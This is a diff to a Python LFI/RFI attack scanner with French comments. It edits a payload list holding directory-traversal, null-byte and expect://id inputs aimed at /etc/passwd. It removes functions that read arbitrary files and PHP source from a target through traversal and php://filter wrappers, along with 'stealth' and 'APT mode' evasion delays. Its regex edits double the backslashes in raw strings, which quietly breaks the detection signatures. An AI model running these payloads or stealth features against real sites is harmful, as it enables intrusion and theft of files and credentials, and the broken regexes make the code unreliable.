@@ -48,7 +48,7 @@ class LFIScanner:
             "expect://id",
             # Null byte (old PHP)
             "../../../../etc/passwd%00",
-            "../../../../etc/passwd\0",
+            "../../../../etc/passwd\\0",
             # Path traversal variants
             "/etc/passwd",
             "file:///etc/passwd",
@@ -78,10 +78,10 @@ class LFIScanner:
         self.success_signatures = {
             "etc_passwd": [r'root:.*:0:0:', r'daemon:.*:1:1:', r'bin:.*:2:2:', r'/bin/bash'],
             "win_ini": [r'\[fonts\]', r'\[extensions\]', r'\[mci extensions\]'],
-            "php_source": [r'<\?php', r'define\s*\(', r'function\s+\w+\s*\(', r'class\s+\w+'],
+            "php_source": [r'<\\?php', r'define\\s*\\(', r'function\\s+\\w+\\s*\\(', r'class\\s+\\w+'],
             "base64": [r'^[A-Za-z0-9+/]{40,}={0,2}$'],
-            "shadow": [r'root:\$.*:\d+:\d+:::'],
-            "hosts": [r'127\.0\.0\.1\s+localhost'],
+            "shadow": [r'root:\\$.*:\\d+:\\d+:::'],
+            "hosts": [r'127\\.0\\.0\\.1\\s+localhost'],
             "env": [r'PATH=', r'HOME=', r'USER=']
         }
         
@@ -307,187 +307,3 @@ class LFIScanner:
                 pass
         
         return result
-    
-    def _test_rfi(self, target: str, param: str, payload: str) -> Dict[str, Any]:
-        """Teste un payload RFI"""
-        result = {
-            'vulnerable': False,
-            'evidence': ''
-        }
-        
-        parsed = urlparse(target)
-        query_params = parse_qs(parsed.query)
-        
-        if param in query_params:
-            query_params[param] = [payload]
-        else:
-            query_params[param] = [payload]
-        
-        new_query = urlencode(query_params, doseq=True)
-        test_url = urlunparse(parsed._replace(query=new_query))
-        
-        try:
-            headers = self._get_headers()
-            response = requests.get(test_url, headers=headers, timeout=15, verify=False)
-            
-            # Indicateurs de RFI réussie
-            rfi_indicators = [
-                '<?php',
-                'shell_exec',
-                'system(',
-                'eval(',
-                'passthru(',
-                'Remote File Inclusion',
-                'allow_url_include'
-            ]
-            
-            for indicator in rfi_indicators:
-                if indicator.lower() in response.text.lower():
-                    result['vulnerable'] = True
-                    result['evidence'] = indicator
-                    break
-                    
-        except requests.exceptions.Timeout:
-            pass
-        except Exception:
-            pass
-        
-        return result
-    
-    def _generate_summary(self, vulnerabilities: List[Dict]) -> Dict[str, Any]:
-        """Génère un résumé des vulnérabilités"""
-        if not vulnerabilities:
-            return {"total": 0, "severity": "INFO", "message": "Aucune vulnérabilité LFI/RFI détectée"}
-        
-        return {
-            "total": len(vulnerabilities),
-            "lfi": len([v for v in vulnerabilities if v['type'] == 'lfi']),
-            "rfi": len([v for v in vulnerabilities if v['type'] == 'rfi']),
-            "critical": len([v for v in vulnerabilities if v['severity'] == 'CRITICAL']),
-            "high": len([v for v in vulnerabilities if v['severity'] == 'HIGH']),
-            "max_risk_score": max([v.get('risk_score', 0) for v in vulnerabilities]) if vulnerabilities else 0
-        }
-    
-    def read_file(self, target: str, param: str, file_path: str) -> Optional[str]:
-        """
-        Tente de lire un fichier via LFI
-        
-        Args:
-            target: URL cible
-            param: Paramètre vulnérable
-            file_path: Chemin du fichier à lire
-        """
-        payloads = [
-            f"../../../../{file_path}",
-            f"../../../../../{file_path}",
-            f"....//....//....//{file_path}",
-            f"..;/..;/..;/{file_path}",
-            f"php://filter/convert.base64-encode/resource={file_path}",
-            f"php://filter/read=convert.base64-encode/resource={file_path}"
-        ]
-        
-        for payload in payloads:
-            self._apply_stealth_delay()
-            
-            parsed = urlparse(target)
-            query_params = parse_qs(parsed.query)
-            query_params[param] = [payload]
-            new_query = urlencode(query_params, doseq=True)
-            test_url = urlunparse(parsed._replace(query=new_query))
-            
-            try:
-                headers = self._get_headers()
-                response = requests.get(test_url, headers=headers, timeout=10, verify=False)
-                
-                # Décoder base64 si nécessaire
-                if 'base64' in payload:
-                    try:
-                        decoded = base64.b64decode(response.text.strip()).decode('utf-8', errors='ignore')
-                        if len(decoded) > 50:
-                            return decoded
-                    except:
-                        pass
-                
-                if len(response.text) > 100 and '<?php' not in response.text:
-                    return response.text[:5000]
-                    
-            except Exception:
-                continue
-        
-        return None
-    
-    def read_source_code(self, target: str, param: str, script_path: str) -> Optional[str]:
-        """
-        Tente de lire le code source via wrappers PHP
-        
-        Args:
-            target: URL cible
-            param: Paramètre vulnérable
-            script_path: Chemin du script
-        """
-        wrappers = [
-            f"php://filter/convert.base64-encode/resource={script_path}",
-            f"php://filter/read=convert.base64-encode/resource={script_path}",
-            f"php://filter/convert.base64-decode/resource={script_path}",
-            f"php://filter/zlib.deflate/resource={script_path}"
-        ]
-        
-        for wrapper in wrappers:
-            self._apply_stealth_delay()
-            result = self._test_lfi(target, param, wrapper, 5)
-            
-            if result['vulnerable'] and result.get('file_type') == 'php_source':
-                # Récupérer le contenu décodé
-                parsed = urlparse(target)
-                query_params = parse_qs(parsed.query)
-                query_params[param] = [wrapper]
-                new_query = urlencode(query_params, doseq=True)
-                test_url = urlunparse(parsed._replace(query=new_query))
-                
-                try:
-                    headers = self._get_headers()
-                    response = requests.get(test_url, headers=headers, timeout=10, verify=False)
-                    
-                    if 'base64' in wrapper:
-                        try:
-                            decoded = base64.b64decode(response.text.strip()).decode('utf-8', errors='ignore')
-                            if len(decoded) > 50:
-                                return decoded
-                        except:
-                            pass
-                except:
-                    pass
-        
-        return None
-    
-    def get_statistics(self) -> Dict[str, Any]:
-        """Retourne les statistiques du scanner"""
-        return {
-            "stealth_mode": self.stealth_mode,
-            "apt_mode": self.apt_mode,
-            "lfi_payloads_count": len(self.lfi_payloads),
-            "rfi_payloads_count": len(self.rfi_payloads)
-        }
-
-
-# Point d'entrée pour tests
-if __name__ == "__main__":
-    print("=" * 60)
-    print("Test de LFIScanner")
-    print("=" * 60)
-    
-    scanner = LFIScanner()
-    
-    # Configuration mode APT
-    scanner.set_stealth_config({
-        'enabled': True,
-        'apt_mode': True,
-        'delay_min': 2,
-        'delay_max': 5
-    })
-    
-    # Test (simulé)
-    # results = scanner.scan("https://example.com/page?file=index")
-    # print(f"Vulnérabilités LFI/RFI: {results['count']}")
-    
-    print("\n✅ Module LFIScanner chargé avec succès")
